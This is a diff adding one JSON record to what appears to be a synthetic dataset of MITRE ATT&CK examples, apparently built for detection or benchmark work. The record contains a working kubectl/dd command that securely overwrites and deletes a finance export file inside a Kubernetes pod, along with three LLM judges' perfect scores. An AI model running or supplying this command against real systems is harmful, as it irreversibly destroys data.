@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'ns=finance; pod=$(kubectl get pod -n \"$ns\" -l app=etl -o jsonpath=\"{.items[0].metadata.name}\"); kubectl exec -n \"$ns\" \"$pod\" -- bash -c '\\''f=/data/exports/q1.csv; sz=$(stat -c%s \"$f\"); dd if=/dev/urandom of=\"$f\" bs=$sz count=1 conv=notrunc,fdatasync status=none && rm -f \"$f\"'\\'''",
+  "explanation": "Executes within a Kubernetes pod to overwrite and delete a specific file on an attached volume.",
+  "rationale_steps": [
+    "Select a target pod by label",
+    "Execute a command inside the pod",
+    "Measure file size and overwrite with random data",
+    "Flush changes and remove the file"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-9214ae56-1cf89486",
+  "source_prompt_hash": "9214ae56",
+  "timestamp_utc": "2025-09-30T07:55:14.956261Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, valid command separators, correct flag formats, and appropriate escape sequences for nested bash commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1485 Data Destruction technique by first overwriting a CSV file with random data (using dd with /dev/urandom) and then deleting it, making recovery impossible.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T01:23:28.633857Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct nesting of bash -c, proper escape sequences for inner quotes, and valid flags for all utilities.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely achieves data destruction (T1485) by overwriting the target file with random data using dd based on its exact size, ensuring unrecoverability, and then deleting it.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:23:34.406610Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced single-quote escaping for nested bash -c, valid kubectl/jsonpath usage, and correct dd/stat options with proper separators.",
+        "semantic_score": 5,
+        "semantic_justification": "Overwrites a specified file with random data inside a Kubernetes pod and then deletes it, aligning directly with data destruction (T1485).",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T01:24:31.915105Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
